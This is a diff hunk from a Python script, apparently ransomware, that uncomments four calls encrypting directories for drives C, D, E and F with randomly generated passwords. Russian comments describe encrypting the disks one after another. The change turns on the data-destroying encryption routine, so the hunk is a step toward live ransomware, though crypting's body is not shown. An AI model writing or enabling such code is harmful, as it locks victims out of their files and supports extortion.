@@ -52,10 +52,10 @@ def crypting(dir, password):
 
 
 try:
-    #crypting(dir_c, password=generate_pass())
-    #crypting(dir_d, password=generate_pass())
-    #crypting(dir_e, password=generate_pass())
-    #crypting(dir_f, password=generate_pass())
+    crypting(dir_c, password=generate_pass())
+    crypting(dir_d, password=generate_pass())
+    crypting(dir_e, password=generate_pass())
+    crypting(dir_f, password=generate_pass())
     #crypt_disk(dir_e, password=generate_pass()) # запускаем без потоков и процессов
     #crypt_disk(dir_f, password=generate_pass()) # диски будут шифроваться по очереди
 except Exception as e:
